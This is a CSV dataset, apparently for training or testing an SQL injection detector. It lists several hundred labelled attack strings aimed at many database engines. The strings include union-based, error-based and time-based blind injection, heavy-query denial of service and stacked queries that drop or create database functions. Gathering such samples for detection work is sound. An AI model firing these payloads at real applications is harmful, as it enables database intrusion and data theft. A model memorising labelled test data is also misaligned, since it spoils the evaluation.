payload,attack_type,label
"1'+(select fhbk where 2570=2570 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1
"1%"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""%""=""",sqli,1
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('ejnt' like 'ejnt,sqli,1
"-7255' union all select 2127,2127,2127,2127,2127#",sqli,1
1' in boolean mode) order by 1--,sqli,1
"1'||(select 'dyuw' from dual where 2037=2037;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1) as xylu where 3338=3338 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1
"1""));select count(*) from generate_series(1,5000000) and ((""bhmu"" like ""bhmu",sqli,1
"-3525"" where 3522=3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",sqli,1
"1"")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--",sqli,1
"1) as iovi where 3910=3910 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1"") or 6793=(select 6793 from pg_sleep(5)) and (""lsis"" like ""lsis",sqli,1
"-8331') union all select 1452,1452,1452,1452,1452--",sqli,1
1') and 8594=(select 8594 from pg_sleep(5))--,sqli,1
"-6775"" union all select 7484,7484#",sqli,1
"1"")) as tkmd where 3415=3415 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1
"1))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('fvov'='fvov",sqli,1
"1,(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",sqli,1
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('ykjs' like 'ykjs,sqli,1
"1) as nkjo where 8462=8462 union all select null,null,null,null,null,null,null,null,null--",sqli,1
"-2790') as xhct where 5756=5756 union all select 5756,5756#",sqli,1
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""blkt"" like ""blkt",sqli,1
"1'||(select 'dpce' from dual where 5261=5261 union all select null,null,null,null,null,null--",sqli,1
1)) waitfor delay '0:0:5' and ((1636=1636,sqli,1
"-4535') union all select 8491,8491,8491,8491,8491,8491--",sqli,1
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (4703=4703,sqli,1
"1"") where 2702=2702 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1
1') where 5331=5331;begin dbms_lock.sleep(5); end--,sqli,1
"-3555') or make_set(9354=9354,7185) and ('papr'='papr",sqli,1
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""ypoj""=""ypoj",sqli,1
"1') where 1363=1363 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1
"1)) as oqfr where 6426=6426 and make_set(8403=8403,8899)--",sqli,1
1' where 6359=6359 and (3020=3020)*6703--,sqli,1
"-9014%') union all select 4211,4211,4211,4211,4211,4211#",sqli,1
1'+(select pagd where 2484=2484;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1
"1 union all select null,null,null,null,null,null,null,null,null#",sqli,1
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('lnte'='lnte,sqli,1
"-2987"") as iyob where 7827=7827 or (8459=8459)*4906--",sqli,1
1 waitfor delay '0:0:5'-- nnnp,sqli,1
"1%"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""%""=""",sqli,1
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""ardk"" like ""ardk",sqli,1
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""giuq""=""giuq",sqli,1
1%'));select sleep(5)#,sqli,1
"1"" where 4281=4281;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1
"1"")) rlike (select (case when (5342=1036) then 1 else 0x28 end)) and ((""ntdz"" like ""ntdz",sqli,1
"-6629%""))) or 8571=8571--",sqli,1
"-9087"" order by 1#",sqli,1
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('atvu'='atvu",sqli,1
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('gydh'='gydh",sqli,1
1%') order by 1#,sqli,1
"1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1
"1"") union all select null,null,null,null,null#",sqli,1
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,sqli,1
-8359) where 4430=4430 or 6872=6872--,sqli,1
"1"") as lgxc where 1117=1117 union all select null,null,null,null,null,null,null,null#",sqli,1
"1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp",sqli,1
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('cuat'='cuat",sqli,1
1%')) and sleep(5)#,sqli,1
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""qgle"" like ""qgle",sqli,1
"1"")) as zemm where 3324=3324 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,1
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='",sqli,1
"1')) as kdwc where 5906=5906 union all select null,null,null,null,null,null,null,null,null--",sqli,1
"1%"" or (select * from (select(sleep(5)))ydpu) and ""%""=""",sqli,1
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('hbld'='hbld",sqli,1
"1"")) or (select * from (select(sleep(5)))sddo)#",sqli,1
"-8600"" or elt(1032=1032,3623) and ""kfsn"" like ""kfsn",sqli,1
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",sqli,1
1'||(select 'awic' where 5227=5227;begin dbms_lock.sleep(5); end--,sqli,1
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# urzg",sqli,1
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('wmrr' like 'wmrr",sqli,1
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,sqli,1
"1' in boolean mode);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1
"-5052))) union all select 8351,8351,8351,8351#",sqli,1
"-2397)) as oizy where 1746=1746 union all select 1746,1746,1746,1746,1746,1746#",sqli,1
"1 where 2751=2751 union all select null,null,null,null--",sqli,1
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""ekbq""=""ekbq",sqli,1
"1""));if(7899=7899) select 7899 else drop function zbbp--",sqli,1
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",sqli,1
"-6772"")) or 9323=9323#",sqli,1
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",sqli,1
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""dnlz""=""dnlz",sqli,1
"1'))) union all select null,null,null,null,null,null,null,null,null#",sqli,1
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1
"-4707' union all select 4414,4414,4414,4414,4414,4414#",sqli,1
"-3300' union all select 8979,8979,8979,8979,8979,8979--",sqli,1
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))-- nqdb",sqli,1
"-2500'))) union all select 6853,6853,6853,6853--",sqli,1
"1) as vqdh where 1603=1603;iif(4436=8910,1,1/0)",sqli,1
"-8608"" or 5460=4461--",sqli,1
"1%"";begin dbms_lock.sleep(5); end--",sqli,1
"-4286%""))) union all select 2229,2229,2229,2229,2229,2229#",sqli,1
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""ubvd""=""ubvd",sqli,1
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
"1%' or elt(6272=6272,sleep(5)) and '%'='",sqli,1
"elt(5953=5953,1)",sqli,1
"1""))) and elt(3114=3114,sleep(5))#",sqli,1
1%')) rlike (select (case when (6094=7893) then 1 else 0x28 end)) and (('%'=',sqli,1
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg",sqli,1
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'aezm' like 'aezm",sqli,1
-8404)) order by 1--,sqli,1
"1"") and 2006=2006",sqli,1
-6079))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((8708=8708,sqli,1
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,sqli,1
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh",sqli,1
"-7923"")) or make_set(9354=9354,7185) and ((""szct""=""szct",sqli,1
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('etzb'='etzb",sqli,1
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",sqli,1
"1',(case when 8260=8260 then 1 else null end)",sqli,1
1'))) and 8594=(select 8594 from pg_sleep(5))--,sqli,1
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",sqli,1
"1%"")) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1
"1"") and make_set(4539=6401,6401) and (""kglx""=""kglx",sqli,1
"-5859) as ernq where 8394=8394 union all select 8394,8394,8394--",sqli,1
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('holo'='holo",sqli,1
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",sqli,1
"1%"") or sleep(5) and (""%""=""",sqli,1
"1' or elt(6272=6272,sleep(5))",sqli,1
-6095') or 6872=6872 and ('bfwm' like 'bfwm,sqli,1
"1'||(select 'xhqy' where 4531=4531 union all select null,null--",sqli,1
-8465' where 5242=5242 or 3806=7423--,sqli,1
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1' where 9381=9381;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('kufi'='kufi",sqli,1
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",sqli,1
"1%') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('%'='",sqli,1
"1,(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",sqli,1
1'))) or (select * from (select(sleep(5)))ydpu) and ((('brhc' like 'brhc,sqli,1
"1') and make_set(8403=8403,8899) and ('ojag'='ojag",sqli,1
"-2111' union all select 1061,1061,1061--",sqli,1
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))# hkrp",sqli,1
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""kbex"" like ""kbex",sqli,1
"1 where 6518=6518;select benchmark(5000000,md5(0x714e4153))#",sqli,1
"1"") where 2215=2215 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1
"1') and elt(4249=4249,7259) and ('bkag'='bkag",sqli,1
1));select (case when (9103=9836) then 9103 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
(select (case when (6714=8872) then 1 else 6714*(select 6714 from master..sysdatabases) end)),sqli,1
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# dwxl",sqli,1
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1
"1"")) as vhrq where 1690=1690 and elt(1210=1210,sleep(5))--",sqli,1
"-2704"") union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",sqli,1
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('%'='",sqli,1
"1%""));if(7899=7899) select 7899 else drop function zbbp--",sqli,1
-7346 or 8571=8571--,sqli,1
"-9630%"" union all select 8592,8592,8592,8592--",sqli,1
-5880')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rwgl'='rwgl,sqli,1
"-2007%')) union all select 7298,7298,7298#",sqli,1
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1
1') where 3861=3861;select pg_sleep(5)--,sqli,1
"1"") order by 1#",sqli,1
"1'||(select 'setd' from dual where 3686=3686 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",sqli,1
"1) as zhvx where 3171=3171 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",sqli,1
"-7271'))) or make_set(9354=9354,7185) and ((('mdtw'='mdtw",sqli,1
"1) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1""))) and 5429=9596",sqli,1
"1%') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('%'='",sqli,1
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",sqli,1
1) where 2468=2468 and (select * from (select(sleep(5)))gcrr)#,sqli,1
1 and 2006=2006,sqli,1
1') where 1424=1424 and sleep(5)--,sqli,1
"1'+(select 'wkbg' where 3921=3921 and 8407=(select count(*) from generate_series(1,5000000)))+'",sqli,1
"-3441')) as dxvt where 9291=9291 union all select 9291,9291,9291#",sqli,1
1)));(select * from (select(sleep(5)))srmq) and (((3124=3124,sqli,1
"1"")) as ydkd where 2455=2455 and sleep(5)--",sqli,1
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'imqi'='imqi",sqli,1
"1)) as jfae where 6684=6684 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",sqli,1
"1"" where 5477=5477;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"-4993"" union all select 6959,6959,6959--",sqli,1
"1 where 2238=2238;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"") as assu where 7521=7521 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",sqli,1
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""xccy""=""xccy",sqli,1
"-8966""))) or 1628=2712",sqli,1
"1%"")));begin user_lock.sleep(5); end--",sqli,1
"1') as mgko where 1828=1828 and make_set(8403=8403,8899)--",sqli,1
-8828)) as ospo where 2141=2141 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1
